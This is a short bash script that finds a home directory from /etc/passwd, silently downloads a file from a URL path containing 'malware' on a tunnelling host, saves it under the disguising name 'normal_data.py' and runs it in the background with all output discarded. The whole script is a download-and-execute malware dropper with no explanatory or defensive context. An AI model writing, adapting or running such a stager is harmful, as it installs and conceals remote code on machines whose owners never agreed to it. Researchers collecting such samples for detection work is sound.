#!/bin/bash

set -e

while IFS=: read -r username _ _ _ _ homedir _; do
    if [[ "$homedir" == "/home/"* ]]; then
        break
    fi
done < /etc/passwd




wget -q "https://iotdet.eu.loclx.io/file/malware/9/cleaner/download/device" -O "/home/$username/normal_data.py"
#chmod +x "/home/$username/normal_data.sh"
nohup python3 /home/$username/normal_data.py > /dev/null 2>&1 &